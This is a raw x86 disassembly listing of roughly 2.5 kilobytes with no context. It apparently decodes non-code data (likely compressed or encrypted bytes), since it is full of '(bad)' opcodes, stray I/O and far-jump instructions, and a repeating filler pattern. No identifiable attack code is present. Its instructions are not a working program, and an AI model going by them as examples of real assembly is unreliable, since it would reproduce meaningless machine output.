  416fbd:	jnp    0x416f52
  416fbf:	repnz sub ebx,eax
  416fc2:	lahf   
  416fc3:	pop    esi
  416fc4:	sbb    al,0xde
  416fc6:	aaa    
  416fc7:	pop    esp
  416fc8:	cmp    DWORD PTR [ebp+esi*2+0x5f],0x30e44103
  416fd0:	sub    al,ah
  416fd2:	imul   BYTE PTR [ebp+0x1d]
  416fd5:	mov    edi,0xe396cb6
  416fda:	rcl    esi,cl
  416fdc:	(bad)  
  416fde:	xor    eax,ecx
  416fe0:	jg     0x416f8f
  416fe2:	xor    BYTE PTR [eax+0x1a],ch
  416fe5:	jmp    0x416fdf
  416fe7:	ja     0x416fce
  416fe9:	sti    
  416fea:	add    bl,ah
  416fec:	or     al,0x33
  416fee:	inc    ecx
  416fef:	cmp    eax,0x67e5e6fc
  416ff4:	dec    esi
  416ff5:	jge    0x416fbe
  416ff7:	adc    DWORD PTR [eax+0x1095c111],ecx
  416ffd:	test   al,dl
  416fff:	call   0x5276d5a4
  417004:	xor    ecx,edi
  417006:	add    edx,DWORD PTR [esi]
  417008:	add    DWORD PTR [esi+0x13],eax
  41700b:	hlt    
  41700c:	stos   BYTE PTR es:[edi],al
  41700d:	and    edi,DWORD PTR [eax-0x6]
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,esp
  417081:	in     al,dx
  417082:	test   al,0xa4
  417084:	pusha  
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	(bad)  
  41708d:	out    dx,al
  41708e:	imul   ecx,DWORD PTR [ecx-0x311ba768],0x4c8f1b76
  417098:	push   esp
  41709a:	and    eax,0x36d3028f
  41709f:	test   al,0x64
  4170a1:	loope  0x4170b5
  4170a3:	mov    dh,bl
  4170a5:	sub    BYTE PTR [eax],bh
  4170a7:	shl    cl,0x41
  4170aa:	je     0x41705e
  4170ac:	push   es
  4170ad:	ror    BYTE PTR [ebp-0x26],1
  4170b0:	xor    DWORD PTR [edi-0x780e6ee5],esp
  4170b6:	faddp  st(1),st
  4170b8:	mov    esp,0xbbcbc872
  4170bd:	test   ebp,esp
  4170bf:	lahf   
  4170c0:	outs   dx,DWORD PTR ds:[esi]
  4170c1:	vfnmadd132sd xmm5,xmm2,xmm5
  4170c6:	push   0xf560c87d
  4170cb:	sub    edi,esp
  4170cd:	push   cs
  4170ce:	push   cs
  4170cf:	jl     0x41713f
  4170d1:	and    al,0x7
  4170d3:	fiadd  DWORD PTR [edi-0x2f]
  4170d6:	jmp    0x41714f
  4170d8:	cli    
  4170d9:	fnstcw WORD PTR [esi]
  4170db:	aam    0xd5
  4170dd:	sub    al,cl
  4170df:	lahf   
  4170e0:	mov    ds:0x72960363,al
  4170e5:	mov    ebx,0xba449fbb
  4170ea:	adc    bl,0xe6
  4170ed:	pushf  
  4170ee:	hlt    
  4170ef:	push   eax
  4170f0:	faddp  st(2),st
  4170f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170f3:	pop    ecx
  4170f4:	sbb    al,0x3f
  4170f6:	shl    ebx,cl
  4170f8:	cs push 0xceae7681
  4170fe:	push   0x42177d31
  417103:	in     al,dx
  417104:	adc    al,0xa6
  417106:	ret    
  417107:	sub    DWORD PTR [eax+0x26],ecx
  41710a:	add    ebx,ecx
  41710c:	cwde   
  41710d:	mov    al,ds:0x3e10546f
  417112:	pop    es
  417113:	add    bl,BYTE PTR [eax+0xccf58a9]
  417119:	pop    ebp
  41711a:	or     dl,0x9a
  41711d:	pop    ss
  41711e:	out    dx,al
  41711f:	adc    al,0x17
  417121:	loopne 0x4170e1
  417123:	les    esi,FWORD PTR [ebx-0x3115fe20]
  417129:	pop    edx
  41712a:	fninit 
  41712c:	add    edi,DWORD PTR [edx]
  41712e:	loop   0x417163
  417130:	mov    ecx,DWORD PTR [ecx]
  417132:	in     al,dx
  417133:	dec    ebp
  417134:	add    ch,cl
  417136:	push   esp
  417137:	hlt    
  417138:	mov    ecx,0xd71f18da
  41713d:	fcomi  st,st(5)
  41713f:	test   BYTE PTR [edx],dl
  417141:	(bad)  
  417142:	jl     0x41717c
  417144:	cld    
  417145:	dec    eax
  417146:	mov    edi,0x7bea0d8f
  41714b:	jmp    0xa6addbdd
  417150:	les    esi,FWORD PTR [edx+0x7b]
  417153:	(bad)  
  417154:	scas   al,BYTE PTR es:[edi]
  417155:	out    0x32,al
  417157:	pop    edx
  417158:	loope  0x4171a9
  41715a:	pushf  
  41715b:	fwait
  41715c:	lds    ebx,FWORD PTR [esi-0x1fa72377]
  417162:	sbb    eax,0x90889d3f
  417167:	pop    ss
  417168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417169:	mov    esp,0xf519ba86
  41716e:	pusha  
  41716f:	fcomp  QWORD PTR [ebp-0x17ef82ef]
  417175:	cmp    DWORD PTR [ebx+0xa8940ca],ecx
  41717b:	leave  
  41717c:	mov    ecx,0xbde8b131
  417181:	and    eax,0x80d419c0
  417186:	test   eax,0xa0f8058e
  41718b:	adc    eax,0xb3b70993
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	adc    BYTE PTR [esi-0xb9b4771],dl
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	ror    DWORD PTR [ecx+edx*8],cl
  41720f:	jnp    0x417209
  417211:	and    al,0xdf
  417213:	into   
  417214:	dec    eax
  417215:	ja     0x4171b6
  417217:	ret    
  417218:	repz retf 
  41721a:	and    esi,ecx
  41721c:	jae    0x4171ad
  41721e:	clc    
  41721f:	sbb    dh,BYTE PTR [ecx+eiz*2]
  417222:	adc    DWORD PTR [ebp+0x72e83bea],edi
  417228:	mov    dl,0xd9
  41722a:	repnz or cl,BYTE PTR [edx-0x51ff7e02]
  417231:	xchg   esi,eax
  417232:	repz daa 
  417234:	adc    DWORD PTR [ebp+0x3d],ecx
  417237:	ins    BYTE PTR es:[edi],dx
  417238:	mov    eax,ds:0x73cb7c9b
  41723d:	jb     0x417216
  41723f:	in     eax,0xf6
  417241:	aas    
  417242:	mov    DWORD PTR [ebp+0x62d57331],ecx
  417248:	int    0x95
  41724a:	jmp    0xe461:0xd614d30c
  417251:	jb     0x4171f7
  417253:	xor    eax,0x3bacbd5c
  417258:	sub    DWORD PTR [edx+0x5c],eax
  41725b:	cmc    
  41725c:	or     edx,DWORD PTR [ebx]
  41725e:	hlt    
  41725f:	pop    edx
  417260:	mov    DWORD PTR [ecx+0x57],ebp
  417263:	and    BYTE PTR [ebx-0x2ad67105],cl
  417269:	push   ss
  41726a:	scas   eax,DWORD PTR es:[edi]
  41726b:	icebp  
  41726c:	sub    esp,eax
  41726e:	lods   al,BYTE PTR ds:[esi]
  41726f:	mov    bl,0x65
  417271:	push   ds
  417272:	fidiv  DWORD PTR [ecx]
  417274:	jns    0x4172c7
  417276:	mov    BYTE PTR [eax+0x74],al
  417279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41727a:	xchg   BYTE PTR [ebx+0x4439ceb7],dh
  417280:	cld    
  417281:	fwait
  417282:	push   eax
  417283:	popa   
  417284:	ficom  WORD PTR [ecx]
  417286:	int    0xda
  417288:	push   edx
  417289:	mov    edx,0x6dcc10e1
  41728e:	fstp   TBYTE PTR [eax-0x4f]
  417291:	shr    DWORD PTR [edx+0x23e93cb4],1
  417297:	jne    0x41727b
  417299:	sbb    al,0x21
  41729b:	adc    DWORD PTR [esi],ecx
  41729d:	and    BYTE PTR [esi+0x79780ef2],bl
  4172a3:	fsubr  DWORD PTR [ecx-0x21e8a480]
  4172a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172aa:	stc    
  4172ab:	adc    DWORD PTR [edi-0x77ee143a],ebx
  4172b1:	fimul  DWORD PTR [edx+0x67659866]
  4172b7:	sub    DWORD PTR [ebp-0x2f],esp
  4172ba:	push   cs
  4172bb:	in     eax,dx
  4172bc:	push   edi
  4172bd:	faddp  st(2),st
  4172bf:	les    esp,FWORD PTR [ecx+ebp*8-0x2130c2a4]
  4172c6:	sbb    al,0x0
  4172c8:	inc    ecx
  4172c9:	jbe    0x4172ae
  4172cb:	cwde   
  4172cc:	ss enter 0x7ff8,0x74
  4172d1:	add    DWORD PTR [ecx-0x3f],ebx
  4172d4:	mov    ah,0x49
  4172d6:	pop    ds
  4172d7:	inc    edi
  4172d8:	data16 std 
  4172da:	scas   al,BYTE PTR es:[edi]
  4172db:	test   eax,0xd5aa4ecf
  4172e0:	scas   eax,DWORD PTR es:[edi]
  4172e1:	push   ds
  4172e2:	(bad)  
  4172e3:	mov    dh,0x55
  4172e5:	(bad)  
  4172e6:	mov    edx,0xc7889b4e
  4172eb:	adc    eax,0x9c1cae5d
  4172f0:	xor    al,0xab
  4172f2:	aas    
  4172f3:	retf   0xd296
  4172f6:	dec    esp
  4172f7:	pop    edx
  4172f8:	mov    dh,0x83
  4172fa:	test   DWORD PTR [edi-0x5a],edi
  4172fd:	jecxz  0x417356
  4172ff:	fistp  DWORD PTR [eax+0x1b3d5ea9]
  417305:	xchg   ebx,eax
  417306:	in     al,0xc1
  417308:	cmp    bh,dh
  41730a:	hlt    
  41730b:	into   
  41730c:	iret   
  41730d:	out    0x4a,al
  41730f:	or     BYTE PTR [eax],al
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	(bad)  
  417381:	sbb    eax,0xf568e7de
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	not    BYTE PTR [edx+ebp*8-0x29b10385]
  417393:	int    0x5
  417395:	ja     0x417318
  417397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417398:	loope  0x4173ab
  41739a:	xor    eax,ebp
  41739c:	jg     0x4173cf
  41739e:	lock iret 
  4173a0:	push   ebp
  4173a1:	cdq    
  4173a2:	inc    ecx
  4173a3:	lds    ebx,FWORD PTR [edi]
  4173a5:	pop    eax
  4173a6:	mov    edi,0x882c93de
  4173ab:	push   cx
  4173ad:	test   al,0x6e
  4173af:	ins    BYTE PTR es:[edi],dx
  4173b0:	sub    eax,0x2f268269
  4173b5:	or     DWORD PTR [esi-0x7eabb9e6],esi
  4173bb:	retf   0xfa0
  4173be:	pop    edi
  4173bf:	outs   dx,DWORD PTR ds:[esi]
  4173c0:	test   edx,ebp
  4173c2:	cmp    eax,0xcf750a4e
  4173c7:	adc    DWORD PTR [ebp+0x1e8d1ed8],0x59
  4173ce:	pop    es
  4173cf:	int    0x76
  4173d1:	or     cl,BYTE PTR [ebp+0x2e05024d]
  4173d7:	leave  
  4173d8:	push   cs
  4173d9:	(bad)  
  4173da:	mov    ebx,0xe8035a58
  4173df:	inc    ecx
  4173e0:	push   edx
  4173e1:	cmp    edx,ebx
  4173e3:	or     al,BYTE PTR [edi+0x7a274583]
  4173e9:	std    
  4173ea:	mov    dl,0xa6
  4173ec:	and    eax,0x5174795d
  4173f1:	loope  0x4173c0
  4173f3:	jmp    0x6d5:0x35f1fd16
  4173fa:	int    0x72
  4173fc:	mov    dh,0x1e
  4173fe:	cwde   
  4173ff:	arpl   WORD PTR [ebp-0x7ba203d0],bx
  417405:	loop   0x417415
  417407:	pusha  
  417408:	xchg   bh,ah
  41740a:	mov    fs,WORD PTR [esi+eiz*2-0x3a]
  41740e:	adc    BYTE PTR [eax+ebx*1-0x2e],bh
  417412:	ror    BYTE PTR [esi],cl
  417414:	jg     0x4173b0
  417416:	in     eax,0x4b
  417418:	rcr    ch,0x6
  41741b:	loop   0x41742f
  41741d:	lea    esi,[ecx+0x3ad00a4f]
  417423:	mov    bh,0xc9
  417425:	inc    eax
  417426:	(bad)  
  417427:	je     0x4173c9
  417429:	pop    ebx
  41742a:	push   esi
  41742b:	push   edi
  41742c:	mov    ?,WORD PTR [ebx+0x20]
  41742f:	nop
  417430:	jae    0x417400
  417432:	pop    esp
  417433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417434:	pop    ss
  417435:	lods   al,BYTE PTR ds:[esi]
  417436:	mov    ds:0x35b74aa2,eax
  41743b:	stc    
  41743c:	push   esp
  41743d:	cld    
  41743e:	rcl    BYTE PTR [ecx],0x83
  417441:	mov    ds:0x5f428b85,al
  417446:	bnd call DWORD PTR [edi]
  417449:	or     DWORD PTR [edx],0x74
  41744c:	push   es
  41744d:	sub    BYTE PTR [ebp+0x1409fb88],cl
  417453:	dec    ecx
  417454:	out    0xb3,al
  417456:	scas   eax,DWORD PTR es:[edi]
  417457:	mov    ebx,0x46d59e92
  41745c:	inc    ebx
  41745d:	xchg   esp,eax
  41745e:	push   edx
  41745f:	test   al,dl
  417461:	out    dx,al
  417462:	pop    ecx
  417463:	or     BYTE PTR [ebx],0x3f
  417466:	mov    ah,0xa6
  417468:	arpl   WORD PTR [ebx],cx
  41746a:	mov    esp,0xc8232ba3
  41746f:	adc    BYTE PTR [ebx],bl
  417471:	adc    eax,DWORD PTR [eax+0x77]
  417474:	mov    ebp,0xdd18017c
  417479:	and    al,0x51
  41747b:	mov    edi,0x29350510
  417480:	fdiv   DWORD PTR [esi+0x26]
  417483:	jno    0x41742e
  417485:	push   esi
  417486:	cmp    al,0x51
  417488:	xor    al,0x60
  41748a:	or     ah,BYTE PTR fs:[edi+0x64]
  41748e:	mov    bh,0xf
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	in     eax,0x8a
  417502:	and    edi,DWORD PTR [eax]
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	jle    0x417575
  41750e:	or     DWORD PTR [ecx-0x35],ebx
  417511:	xor    ebp,DWORD PTR [ecx+eiz*8+0x6d]
  417515:	pop    es
  417516:	rcl    ecx,0x86
  417519:	pop    DWORD PTR [ecx+0x7d]
  41751c:	sbb    eax,0xdf63f07a
  417521:	in     al,dx
  417522:	push   esi
  417523:	sub    bh,BYTE PTR [esi+0x78]
  417526:	mov    edx,eax
  417528:	mov    al,ds:0xc01d9b72
  41752d:	dec    edx
  41752e:	mov    al,BYTE PTR [edi]
  417530:	mov    dl,0x9c
  417532:	mov    ?,edi
  417534:	pushf  
  417535:	retf   
  417536:	jecxz  0x417567
  417538:	add    DWORD PTR [edi-0x6d],0xffffff9c
  41753c:	aad    0xe0
  41753e:	push   eax
  41753f:	in     al,0x79
  417541:	mov    eax,ds:0xe053b6f4
  417546:	push   edi
  417547:	adc    eax,0xc33d1974
  41754c:	aam    0x5
  41754e:	pop    ds
  41754f:	push   ecx
  417550:	dec    edi
  417551:	rcl    DWORD PTR [ecx+0x46abea59],1
  417557:	retf   
  417558:	jbe    0x417501
  41755a:	clc    
  41755b:	test   DWORD PTR [esi],eax
  41755d:	and    dh,BYTE PTR [esi-0x2561b4d6]
  417563:	arpl   WORD PTR [ecx-0x5],bx
  417566:	cld    
  417567:	sbb    eax,0xa5f6604c
  41756c:	ror    esi,cl
  41756e:	retf   
  41756f:	cwde   
  417570:	cs mov edi,0x4a603e53
  417576:	push   edx
  417577:	fild   WORD PTR [edx]
  417579:	out    dx,eax
  41757a:	adc    BYTE PTR [ebx-0xd],0x43
  41757e:	xor    ebp,edi
  417580:	ins    BYTE PTR es:[edi],dx
  417581:	mov    ah,0xeb
  417583:	ins    DWORD PTR es:[edi],dx
  417584:	jns    0x41759f
  417586:	ins    BYTE PTR es:[edi],dx
  417587:	pop    esp
  417588:	jmp    0xd1b9:0x43a89e88
  41758f:	(bad)  [ebx-0x1b548088]
  417595:	mov    dl,0xe4
  417597:	ds mov esp,0x69a1ae54
  41759d:	repz pop ecx
  41759f:	cmp    DWORD PTR [edx-0x37],esi
  4175a2:	push   cs
  4175a3:	xor    edx,esi
  4175a5:	(bad)  
  4175a6:	in     eax,dx
  4175a7:	ins    DWORD PTR es:[edi],dx
  4175a8:	and    eax,0x3748264b
  4175ad:	cwde   
  4175ae:	bound  eax,QWORD PTR [esi-0x5ad15234]
  4175b4:	add    BYTE PTR [ebp+eiz*8-0x647eb2c8],bh
  4175bb:	push   ebx
  4175bc:	scas   al,BYTE PTR es:[edi]
  4175bd:	sub    BYTE PTR [ebp-0x5f9c042c],dl
  4175c3:	les    ecx,FWORD PTR [edx+0x70a74f9e]
  4175c9:	pop    eax
  4175ca:	popa   
  4175cb:	(bad)  
  4175cc:	test   al,0xd
  4175ce:	push   edi
  4175cf:	xchg   DWORD PTR [ecx+0xfa8e44b],eax
  4175d5:	aam    0xda
  4175d7:	inc    ebx
  4175d8:	imul   esp,DWORD PTR [ebx+0x29],0x2109bb2a
  4175df:	add    BYTE PTR [edx],ah
  4175e1:	add    DWORD PTR [edx+0x7917f4ae],edi
  4175e7:	das    
  4175e8:	sub    ebx,DWORD PTR [edi+edx*4]
  4175eb:	sbb    ecx,DWORD PTR [ecx+edi*8-0x4206ccbd]
  4175f2:	adc    al,0xd1
  4175f4:	sub    ch,BYTE PTR [ebx*2+0x6dc8e01f]
  4175fb:	dec    ecx
  4175fc:	je     0x4175df
  4175fe:	adc    BYTE PTR [eax],ch
  417600:	pop    ecx
  417601:	xchg   edx,eax
  417602:	fwait
  417603:	inc    ebx
  417604:	jl     0x417668
  417606:	enter  0xe9bd,0x8d
  41760a:	lahf   
  41760b:	int3   
  41760c:	outs   dx,BYTE PTR ds:[esi]
  41760d:	jbe    0x4175fe
  41760f:	out    dx,al
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fiadd  DWORD PTR [edi+0x706e82f9]
  417685:	test   DWORD PTR [eax],0x10400
  41768b:	add    bl,bh
  41768d:	jp     0x4176e4
  41768f:	jmp    0x72bccada
  417694:	(bad)  
  417695:	push   eax
  417696:	push   0x3d
  417698:	out    dx,al
  417699:	inc    ebx
  41769a:	outs   dx,BYTE PTR ds:[esi]
  41769b:	dec    esi
  41769c:	scas   al,BYTE PTR es:[edi]
  41769d:	retf   
  41769e:	call   0x46a440d0
  4176a3:	jmp    0xb4c8:0x5a60203f
  4176aa:	or     al,0x9f
  4176ac:	add    al,0x6c
  4176ae:	push   edx
  4176af:	pop    ds
  4176b0:	cmp    dl,BYTE PTR [edi+0x40]
  4176b3:	pusha  
  4176b4:	stos   BYTE PTR es:[edi],al
  4176b5:	jmp    0x41764e
  4176b7:	lods   al,BYTE PTR ds:[esi]
  4176b8:	cli    
  4176b9:	sub    BYTE PTR [ebp+ecx*1-0x6f6eaed6],al
  4176c0:	cmp    ebp,DWORD PTR [ebp+0x55fd0743]
  4176c6:	mov    ebx,0xbfc96724
  4176cb:	call   0x34577401
  4176d0:	pusha  
  4176d1:	adc    esi,eax
  4176d3:	mov    ebp,DWORD PTR [eax]
  4176d5:	mov    al,ds:0xc8aad2ff
  4176da:	push   ds
  4176db:	inc    esp
  4176dc:	mov    al,ds:0x5582c58b
  4176e1:	sub    al,0x70
  4176e3:	popf   
  4176e4:	das    
  4176e5:	enter  0xb1f4,0xb0
  4176e9:	mov    edx,ecx
  4176eb:	stos   DWORD PTR es:[edi],eax
  4176ec:	and    ecx,ebx
  4176ee:	or     ecx,DWORD PTR [eax+ebp*1+0x2e69a5c0]
  4176f5:	push   edx
  4176f6:	push   eax
  4176f7:	sub    al,0xd7
  4176f9:	mov    ecx,eax
  4176fb:	sub    dl,BYTE PTR [edx]
  4176fd:	pop    eax
  4176fe:	adc    bl,dl
  417700:	cli    
  417701:	xor    eax,0xf1ecf1e9
  417706:	retf   0xccea
  417709:	pop    ds
  41770a:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41770c:	sub    ah,cl
  41770e:	push   eax
  41770f:	sahf   
  417710:	sti    
  417711:	cmp    bh,al
  417713:	dec    ecx
  417714:	pop    esp
  417715:	add    ebx,esp
  417717:	arpl   di,di
  417719:	fsubr  DWORD PTR [edi-0x3f2751e4]
  41771f:	leave  
  417720:	cmp    BYTE PTR [edi+0x6e32821c],0xc4
  417727:	test   BYTE PTR [eax-0x157b2759],0xbe
  41772e:	mov    ebp,0x55d3510a
  417733:	jle    0x41770e
  417735:	xor    BYTE PTR [edi],ah
  417737:	mov    ebx,0x5dcc2eea
  41773c:	lea    edi,[esp+edx*8+0x41]
  417740:	scas   al,BYTE PTR es:[edi]
  417741:	jg     0x4177b7
  417743:	repz loope 0x417778
  417746:	or     eax,0x6ee1b98f
  41774b:	and    ch,BYTE PTR [edx+eax*4]
  41774e:	or     eax,0x2df5b4d6
  417753:	ret    0x980e
  417756:	lods   al,BYTE PTR ds:[esi]
  417757:	adc    BYTE PTR [ecx+0x38e02a47],bl
  41775d:	xor    ah,BYTE PTR [edx-0x37677b88]
  417763:	add    ebx,eax
  417765:	popa   
  417766:	loope  0x417793
  417768:	xchg   DWORD PTR ds:0x91ada2b3,esp
  41776e:	or     BYTE PTR [ebp-0x1d],al
  417771:	cmp    eax,0xd80e38d8
  417776:	xchg   BYTE PTR [esi],dh
  417778:	cmp    al,0x46
  41777a:	call   0xda52:0x2a6ae82e
  417781:	test   edi,ecx
  417783:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417784:	out    0x1b,al
  417786:	out    0x24,eax
  417788:	call   0x1adf084
  41778d:	dec    edx
  41778e:	xchg   edx,eax
  41778f:	ret    0x0
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	sbb    ecx,ecx
  417802:	jbe    0x417879
  417804:	je     0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	int3   
  41780d:	pop    esi
  41780e:	jg     0xf533cfe0
  417814:	aad    0x6f
  417816:	je     0x417875
  417818:	cmp    dl,dl
  41781a:	push   ebx
  41781b:	add    dl,bl
  41781d:	mov    bl,0xe6
  41781f:	int3   
  417820:	cmc    
  417821:	xor    BYTE PTR [edi+edx*4],0xc6
  417825:	mov    edi,0x82483ec1
  41782a:	push   ss
  41782b:	div    DWORD PTR [ebp-0x710b8553]
  417831:	and    cl,BYTE PTR [ebp-0x5607df6b]
  417837:	fidivr WORD PTR cs:[ebp+0x13cf2c3a]
  41783e:	jmp    0x417871
  417840:	xor    al,0x25
  417842:	mov    dl,BYTE PTR ds:0x898fd33d
  417848:	rcl    ch,0x7d
  41784b:	mov    dh,0x57
  41784d:	xchg   esp,eax
  41784e:	inc    edi
  41784f:	mov    ds:0x7016d1c5,eax
  417854:	mov    ecx,0xf8ee0b15
  417859:	sti    
  41785a:	pop    edx
  41785b:	out    dx,al
  41785c:	sub    edx,DWORD PTR [edi-0x7a]
  41785f:	push   0x6ff11d18
  417864:	lahf   
  417865:	fwait
  417866:	jmp    0xff0e:0xa82a4e81
  41786d:	aas    
  41786e:	pushf  
  41786f:	adc    bh,dh
  417871:	add    ah,BYTE PTR [ecx]
  417873:	or     bl,dh
  417875:	in     al,0xdc
  417877:	push   0xffffffbf
  417879:	bswap  esi
  41787b:	mov    al,0x6c
  41787d:	inc    eax
  41787e:	retf   0x4ee9
  417881:	rep stos BYTE PTR es:[edi],al
  417883:	xchg   esi,eax
  417884:	ret    0x9928
  417887:	add    eax,DWORD PTR [edi+0x2c2e512d]
  41788d:	loope  0x4178fa
  41788f:	or     eax,0x439adf33
  417894:	inc    edi
  417895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417896:	call   0xdad8:0x2af95389
  41789d:	(bad)  
  41789e:	mov    ds:0x7ffbaefc,al
  4178a3:	jl     0x4178ea
  4178a5:	les    esp,FWORD PTR [ecx+eax*1+0x4d]
  4178a9:	xchg   ecx,eax
  4178aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ab:	(bad)  
  4178ad:	ins    BYTE PTR es:[edi],dx
  4178ae:	and    eax,0x4d33efe
  4178b3:	loopne 0x417885
  4178b5:	in     eax,dx
  4178b6:	mov    dl,0x73
  4178b8:	fs pop ds
  4178ba:	push   cs
  4178bb:	test   BYTE PTR [ecx+ecx*4+0x4f],al
  4178bf:	stc    
  4178c0:	aaa    
  4178c1:	hlt    
  4178c2:	cmp    DWORD PTR [eax+0x43],ebp
  4178c5:	fs push ds
  4178c7:	fisub  DWORD PTR [ebp+eax*2+0x20ad4eda]
  4178ce:	mov    BYTE PTR [ecx],bl
  4178d0:	(bad)  
  4178d1:	mov    eax,0xdcda4ba0
  4178d6:	push   0xdbc8fec4
  4178db:	or     eax,0x9b6a6a8d
  4178e0:	jb     0x41794d
  4178e2:	jb     0x417867
  4178e4:	hlt    
  4178e5:	add    DWORD PTR [ecx+eiz*4],ebp
  4178e8:	pop    esi
  4178e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ea:	outs   dx,BYTE PTR ds:[esi]
  4178eb:	inc    edx
  4178ec:	and    BYTE PTR [edi],bh
  4178ee:	mov    ah,0x92
  4178f0:	add    bl,BYTE PTR [ebx-0x4817b567]
  4178f6:	push   0x96974840
  4178fb:	mov    BYTE PTR [edi],ch
  4178fd:	mov    edi,0x90628b49
  417902:	cli    
  417903:	xor    esi,ecx
  417905:	lock into 
  417907:	stos   DWORD PTR es:[edi],eax
  417908:	add    esi,DWORD PTR [ecx]
  41790a:	icebp  
  41790b:	pushf  
  41790c:	sbb    eax,0x3b0d08
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	cmp    eax,0x785ff86d
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	mov    dl,0x2b
  41798e:	sbb    eax,0xcc7b8b3d
  417993:	aaa    
  417994:	shl    edx,cl
  417996:	daa    
  417997:	and    bl,dl
  417999:	cmc    
  41799a:	sbb    eax,0xf3c363b1
  41799f:	pop    ss
  4179a0:	ss jne 0x4179e9
  4179a3:	or     eax,0x5bb2010
  4179a8:	xlat   BYTE PTR ds:[ebx]
  4179a9:	dec    ebp
  4179aa:	mov    ecx,0x56626c28
  4179af:	ror    esp,0x65
  4179b2:	add    edx,DWORD PTR [ebp+0x70]
  4179b5:	sub    eax,0xf5a66018
  4179ba:	sbb    al,BYTE PTR [esi-0x57]
  4179bd:	cdq    
  4179be:	ja     0x41796e
  4179c0:	dec    esi
  4179c2:	adc    eax,0x8ad394d7
  4179c7:	xchg   edx,eax
  4179c8:	mov    ecx,0x2943ee58
  4179cd:	xchg   esi,eax
  4179ce:	jae    0x417a2c
  4179d0:	das    
  4179d1:	shl    DWORD PTR [edx+0x3159a857],0x76
  4179d8:	dec    eax
  4179d9:	jo     0x417a44
  4179db:	adc    bh,bl
  4179dd:	pop    esi
  4179de:	lahf   
  4179df:	push   esp
  4179e0:	rol    DWORD PTR [eax+eiz*8-0x3a4c815a],cl
  4179e7:	push   0x60
  4179e9:	jmp    0x4d67:0x3b1b109a
  4179f0:	aam    0xe0
  4179f2:	repz (bad) [ebp*1-0x29d10ec4]
  4179fa:	rol    BYTE PTR [ecx+0x22],1
  4179fd:	push   esi
  4179fe:	icebp  
  4179ff:	inc    esp
  417a00:	pop    ecx
  417a01:	xchg   edx,eax
  417a02:	aas    
  417a03:	cmp    eax,0x4a1c1522
  417a08:	inc    edi
  417a09:	pop    ds
  417a0a:	aad    0xad
  417a0c:	fmul   QWORD PTR [eax-0x7e]
  417a0f:	fadd   st,st(0)
  417a11:	jecxz  0x4179c4
  417a13:	pop    ss
  417a14:	in     al,0xeb
  417a16:	mov    dl,0xcd
  417a18:	and    dl,ah
  417a1a:	outs   dx,BYTE PTR ds:[esi]
  417a1b:	fcomi  st,st(0)
  417a1d:	xor    DWORD PTR [esi],0xffffffd0
  417a20:	xchg   edi,eax
  417a21:	add    DWORD PTR [ebp-0x2b],esi
  417a24:	and    ebp,DWORD PTR [ebp-0xc]
  417a27:	pop    ecx
  417a28:	cmp    edi,esi
  417a2a:	jb     0x417aaa
  417a2c:	add    DWORD PTR [eax+0x6460ea1b],esi
  417a32:	xchg   ebx,eax
  417a33:	push   DWORD PTR [esi+0x5ec6adcf]
  417a39:	xor    al,0x5c
  417a3b:	sbb    DWORD PTR [ebx-0x6d],esp
  417a3e:	jne    0x417a07
  417a40:	bnd ss jns 0x417a7d
  417a44:	js     0x4179eb
  417a46:	gs add eax,0x8ab8fb2b
  417a4c:	ja     0x417aa3
  417a4e:	mov    BYTE PTR [ebp-0x41],bl
  417a51:	sbb    cl,ah
  417a53:	jmp    0xd2163e98
  417a58:	pop    esp
  417a59:	and    bh,BYTE PTR [ebx-0x3df3f36e]
  417a5f:	repnz sbb eax,0x4c748d93
